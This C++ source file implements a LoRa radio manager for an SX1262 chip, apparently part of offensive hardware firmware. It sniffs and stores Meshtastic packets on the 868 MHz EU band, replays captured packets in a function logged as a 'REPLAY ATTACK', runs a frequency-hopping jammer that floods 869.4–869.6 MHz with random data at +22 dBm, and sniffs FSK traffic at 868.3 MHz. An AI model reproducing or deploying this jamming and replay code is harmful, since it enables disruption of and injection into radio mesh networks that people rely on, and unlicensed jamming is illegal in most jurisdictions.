#include "LoraManager.h"
#include <string.h>

// Meshtastic default sync word (868 MHz EU)
#define MESHTASTIC_SYNC_WORD 0x2B

LoraManager::LoraManager()
    : mod_(LORA_NSS, LORA_DIO1, LORA_RST, LORA_BUSY), radio_(&mod_) {
  memset(rssiHistory_, 0, sizeof(rssiHistory_));
}

void LoraManager::begin() {
  // Hardware init is deferred until setMode(true) to save power
}

void LoraManager::setMode(bool active) {
  if (!active) {
    stopJamming();
    stopSense();
  }
  active_ = active;
  if (active && !isJamming_ && !isSensing_) {
    Serial.println("[LORA] Powering UP SX1262 (SIGINT)...");
    // Meshtastic: 869.525 MHz, BW 250 kHz, SF 11, CR 5, SyncWord 0x2B
    int state =
        radio_.begin(869.525f, 250.0f, 11, 5, MESHTASTIC_SYNC_WORD, 22, 8);
    if (state == RADIOLIB_ERR_NONE) {
      Serial.println("[LORA] Meshtastic sniffer ready.");
      radio_.startReceive();
    } else {
      Serial.printf("[LORA] Init Failed, code %d\n", state);
    }
  } else {
    stopJamming();
    stopSense();
    radio_.sleep();
    Serial.println("[LORA] Sleeping...");
  }
}

static const float JAM_FREQS[] = {869.4f, 869.5f, 869.6f};
static const int JAM_FREQ_COUNT = 3;
#define LORA_JAM_POWER 22

void LoraManager::startJamming(float centerFreq) {
  if (isJamming_)
    return;
  (void)centerFreq;
  Serial.println("[SILENCE] Starting 868 MHz jammer (+22 dBm)...");
  int state = radio_.begin(869.5f, 250.0f, 11, 5, MESHTASTIC_SYNC_WORD, 22, 8);
  if (state != RADIOLIB_ERR_NONE) {
    Serial.printf("[SILENCE] Init failed %d\n", state);
    return;
  }
  radio_.setOutputPower(LORA_JAM_POWER);
  active_ = true;
  isJamming_ = true;
  jamHopIndex_ = 0;
}

void LoraManager::stopJamming() {
  if (!isJamming_)
    return;
  isJamming_ = false;
  radio_.sleep();
  Serial.println("[SILENCE] Jammer OFF.");
}

void LoraManager::captureAndStore(const uint8_t *rawData, size_t len,
                                  float rssi, float snr) {
  if (len == 0 || len > LORA_RAW_PACKET_MAX)
    return;

  lastPacket_.rssi = rssi;
  lastPacket_.snr = snr;
  lastPacket_.timestamp = millis();
  packetCount_++;

  String hexOut = "";
  for (size_t i = 0; i < len; i++) {
    char cbuf[4];
    snprintf(cbuf, sizeof(cbuf), "%02X ", (unsigned)rawData[i]);
    hexOut += cbuf;
  }
  lastPacket_.data = hexOut;

  lastPacketRawLen_ = len < LORA_RAW_PACKET_MAX ? len : LORA_RAW_PACKET_MAX;
  memcpy(lastPacketRaw_, rawData, lastPacketRawLen_);

  int idx = packetBufferHead_ % LORA_PACKET_BUF_SIZE;
  packetBuffer_[idx].len = lastPacketRawLen_;
  packetBuffer_[idx].rssi = rssi;
  packetBuffer_[idx].snr = snr;
  packetBuffer_[idx].timestamp = lastPacket_.timestamp;
  memcpy(packetBuffer_[idx].data, rawData, packetBuffer_[idx].len);

  packetBufferHead_++;
  if (packetBufferCount_ < LORA_PACKET_BUF_SIZE)
    packetBufferCount_++;
}

void LoraManager::replayLast() {
  if (lastPacketRawLen_ == 0 || !active_)
    return;
  int state = radio_.transmit(lastPacketRaw_, lastPacketRawLen_);
  if (state == RADIOLIB_ERR_NONE) {
    Serial.println("[HACK] REPLAY ATTACK EXECUTED");
    radio_.startReceive();
  } else {
    Serial.printf("[HACK] Replay failed %d\n", state);
    radio_.startReceive();
  }
}

void LoraManager::clearBuffer() {
  packetBufferCount_ = 0;
  packetBufferHead_ = 0;
  lastPacketRawLen_ = 0;
  lastPacket_.data = "";
  lastPacket_.rssi = 0;
  lastPacket_.snr = 0;
  packetCount_ = 0;
  Serial.println("[LORA] Buffer cleared.");
}

const int8_t *LoraManager::getRssiHistory(int &outLen) const {
  outLen = rssiHistoryCount_;
  return rssiHistory_;
}

const LoraRawPacket *LoraManager::getPacketInBuffer(int index) const {
  if (index < 0 || index >= packetBufferCount_)
    return nullptr;
  int idx = (packetBufferHead_ - 1 - index + LORA_PACKET_BUF_SIZE) %
            LORA_PACKET_BUF_SIZE;
  return &packetBuffer_[idx];
}

#define SENSE_FREQ_MHZ 868.3f
#define SENSE_BITRATE 9.6f
#define SENSE_FREQ_DEV 25.0f
#define SENSE_RX_BW 100.0f

void LoraManager::startSense() {
  if (isSensing_)
    return;
  stopJamming();
  Serial.println("[GHOSTS] FSK 868.3 MHz sniffer...");
  int state = radio_.beginFSK(SENSE_FREQ_MHZ, SENSE_BITRATE, SENSE_FREQ_DEV,
                              SENSE_RX_BW, 10, 8);
  if (state != RADIOLIB_ERR_NONE) {
    Serial.printf("[GHOSTS] beginFSK failed %d\n", state);
    return;
  }
  radio_.startReceive();
  active_ = true;
  isSensing_ = true;
  senseHead_ = 0;
  senseCount_ = 0;
  memset(senseEntries_, 0, sizeof(senseEntries_));
}

void LoraManager::stopSense() {
  if (!isSensing_)
    return;
  isSensing_ = false;
  radio_.sleep();
  Serial.println("[GHOSTS] Sense OFF.");
}

const LoraManager::SenseEntry *LoraManager::getSenseEntry(int index) const {
  if (index < 0 || index >= senseCount_)
    return nullptr;
  int i = (senseHead_ - 1 - index + SENSE_ENTRIES) % SENSE_ENTRIES;
  if (i < 0)
    i += SENSE_ENTRIES;
  return &senseEntries_[i];
}

void LoraManager::tick() {
  if (!active_)
    return;

  if (isSensing_) {
    uint8_t buf[64];
    int state = radio_.readData(buf, sizeof(buf));
    if (state == RADIOLIB_ERR_NONE) {
      size_t len = radio_.getPacketLength();
      if (len > sizeof(buf))
        len = sizeof(buf);
      float rssi = radio_.getRSSI();
      int idx = senseHead_ % SENSE_ENTRIES;
      senseEntries_[idx].rssi = rssi;
      senseEntries_[idx].hex[0] = '\0';
      size_t off = 0;
      for (size_t i = 0; i < len && off < sizeof(senseEntries_[idx].hex) - 3;
           i++) {
        int n = snprintf(senseEntries_[idx].hex + off,
                         sizeof(senseEntries_[idx].hex) - off, "%02X ",
                         (unsigned)buf[i]);
        if (n > 0)
          off += (size_t)n;
      }
      senseHead_++;
      if (senseCount_ < SENSE_ENTRIES)
        senseCount_++;
      radio_.startReceive();
    } else if (state != RADIOLIB_ERR_RX_TIMEOUT) {
      radio_.startReceive();
    }
    return;
  }

  if (isJamming_) {
    float freq = JAM_FREQS[jamHopIndex_ % JAM_FREQ_COUNT];
    radio_.setFrequency(freq);
    for (size_t i = 0; i < sizeof(jamBuf_); i++)
      jamBuf_[i] = (uint8_t)(esp_random() & 0xFF);
    radio_.transmit(jamBuf_, sizeof(jamBuf_));
    jamHopIndex_++;
    return;
  }

  unsigned long now = millis();

  // 1. Spectrum monitor: RSSI sample every 100ms
  if (now - lastRssiSampleMs_ >= 100) {
    lastRssiSampleMs_ = now;
    int rssiVal = (int)radio_.getRSSI();
    if (rssiVal >= -128 && rssiVal <= 127) {
      rssiHistory_[rssiHistoryHead_] = (int8_t)rssiVal;
      rssiHistoryHead_ = (rssiHistoryHead_ + 1) % LORA_RSSI_HISTORY_LEN;
      if (rssiHistoryCount_ < LORA_RSSI_HISTORY_LEN)
        rssiHistoryCount_++;
    }
    currentRSSI_ = (float)rssiVal;
    lastUpdate_ = now;
  }

  // 2. Check for packet
  uint8_t buf[LORA_RAW_PACKET_MAX];
  int state = radio_.readData(buf, sizeof(buf));

  if (state == RADIOLIB_ERR_NONE) {
    Serial.println("[LORA] PACKET CAPTURED!");
    size_t len = radio_.getPacketLength();
    if (len > sizeof(buf))
      len = sizeof(buf);
    float rssi = radio_.getRSSI();
    float snr = radio_.getSNR();
    captureAndStore(buf, len, rssi, snr);
    radio_.startReceive();
  } else if (state != RADIOLIB_ERR_RX_TIMEOUT &&
             state != RADIOLIB_ERR_CRC_MISMATCH) {
    radio_.startReceive();
  }
}
